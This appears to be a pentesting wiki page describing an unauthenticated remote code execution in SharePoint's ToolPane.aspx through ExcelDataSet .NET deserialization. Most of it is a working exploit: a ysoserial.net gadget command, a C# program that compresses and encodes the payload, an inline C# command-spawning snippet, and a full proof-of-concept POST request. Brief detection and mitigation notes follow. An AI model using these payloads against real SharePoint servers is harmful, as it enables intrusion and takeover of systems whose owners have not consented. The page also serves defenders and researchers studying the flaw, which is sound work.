# SharePoint ExcelDataSet WebPart RCE (ToolPane.aspx)

{{#include ../../banners/hacktricks-training.md}}

## TL;DR

• SharePoint exposes an unauthenticated Web Part editing endpoint at:

```
/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx
```

• The endpoint processes two POST parameters that can be supplied **without authentication**:

* `MSOTlPn_Uri`  – path/URL to an **.ascx UserControl** that will be dynamically loaded.
* `MSOTlPn_DWP`  – full XML/ASP definition (**DWP**) of the Web Part to render.

• By pointing `MSOTlPn_Uri` to a malicious ASCX file in the `ControlTemplates/15/` directory the attacker gains the ability to execute **inline C#** when the control is rendered.

• Inside the DWP payload the attacker can register the gadget namespace `Microsoft.PerformancePoint.Scorecards` and instantiate the class `Scorecard:ExcelDataSet`.

• The attribute `CompressedDataTable` of that class accepts **GZip-compressed + Base64** serialized `DataTable` objects.  The implementation **inflates and deserializes the DataTable with no type filtering**, giving us a classic **.NET unsafe deserialization primitive**.

• By embedding a gadget chain (for example generated with ysoserial.net’s `TypeConfuseDelegate` or any other working gadget) inside the compressed bytes we achieve **remote command execution on the SharePoint front-end** once the page is processed.

## Vulnerable Parameters

| Parameter | Purpose | Malicious use |
|-----------|---------|---------------|
| `MSOTlPn_Uri` | Location of ASCX control that will be loaded inside the Tool Pane | Point to attacker-controlled  or already writable location (`/_controltemplates/15/AclEditor.ascx`) containing inline C# such as `<%@ Page Language="C#" %><% Response.Write(new System.Diagnostics.Process(){StartInfo = {FileName="cmd.exe",Arguments="/c calc"}}.Start()); %>` |
| `MSOTlPn_DWP` | Web-Part (DWP) definition shown in the Tool Pane | Inject ASP `@Register` directives and the **Scorecard:ExcelDataSet** element carrying our compressed payload |

## Crafting the Deserialization Payload

1. Generate any **.NET `BinaryFormatter`** gadget that spawns commands:

```bash
# Example with ysoserial.net on Windows
y soserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o raw > payload.bin
```

2. Wrap the binary payload inside a `DataTable` object – easiest method is to let .NET do it for you:

```csharp
using System;
using System.Data;
using System.IO;
using System.IO.Compression;
using System.Runtime.Serialization.Formatters.Binary;

class BuildDT {
    static void Main() {
        byte[] gadget = File.ReadAllBytes("payload.bin");
        DataTable dt = new DataTable();
        dt.Columns.Add("Pwn", typeof(byte[]));
        dt.Rows.Add(new object[]{gadget});

        BinaryFormatter bf = new BinaryFormatter();
        MemoryStream ms = new MemoryStream();
        bf.Serialize(ms, dt);

        byte[] compressed;
        using(var g = new GZipStream(new MemoryStream(), CompressionMode.Compress, true)){}
        using (MemoryStream cms = new MemoryStream()) {
            using (GZipStream gz = new GZipStream(cms, CompressionMode.Compress))
                gz.Write(ms.ToArray(),0,(int)ms.Length);
            compressed = cms.ToArray();
        }
        Console.WriteLine(Convert.ToBase64String(compressed));
    }
}
```

3. Place the resulting Base64 string in the `CompressedDataTable` attribute:

```xml
<Scorecard:ExcelDataSet CompressedDataTable="H4sIAAAAA..." DataTable-CaseSensitive="false" runat="server" />
```

## Full Proof-of-Concept Request

```http
POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx HTTP/1.1
Host: victim.sharepoint.local
Content-Type: application/x-www-form-urlencoded

MSOTlPn_Uri=http%3A%2F%2Fvictim.sharepoint.local%2F_controltemplates%2F15%2FAclEditor.ascx&
MSOTlPn_DWP=
<%@ Register Tagprefix="Scorecard" Namespace="Microsoft.PerformancePoint.Scorecards" Assembly="Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" %>
<%@ Register Tagprefix="asp" Namespace="System.Web.UI" Assembly="System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" %>
<asp:UpdateProgress ID="up" runat="server">
<ProgressTemplate>
<Scorecard:ExcelDataSet CompressedDataTable="<BASE64_GZIP_PAYLOAD>" DataTable-CaseSensitive="false" runat="server" />
</ProgressTemplate>
</asp:UpdateProgress>
```

Opening the URL or simply sending the POST request triggers the deserialization chain → execution.

## Detection

* Monitor IIS logs for unauthenticated POSTs to `ToolPane.aspx` containing the above parameters.
* Inspect loaded ASCX files under `CONTROLTEMPLATES/` for suspicious inline code.
* Enable process-creation logging (Sysmon ID 1 / Windows Event 4688) to detect unexpected `w3wp.exe` children.

## Mitigations

1. **Patch** – Microsoft has issued patches tightening validation of the parameters and adding type filters to `ExcelDataSet` (see KB5002458+).
2. **Web.config hardening** – set `SafeControls` to disallow untrusted UserControls and restrict `Scorecard` namespace.
3. **WAF / Rewrite-module** – block requests with `MSOTlPn_Uri` or `MSOTlPn_DWP` parameters coming from untrusted networks.
4. Run SharePoint front-end in a constrained AppPool identity and leverage AMSI/Code Integrity to limit inline compilation.

## References

- [SharePoint ToolPane.aspx WebPart RCE via malicious ASCX and ExcelDataSet](https://gist.github.com/gboddin/6374c04f84b58cef050f5f4ecf43d501)

{{#include ../../banners/hacktricks-training.md}}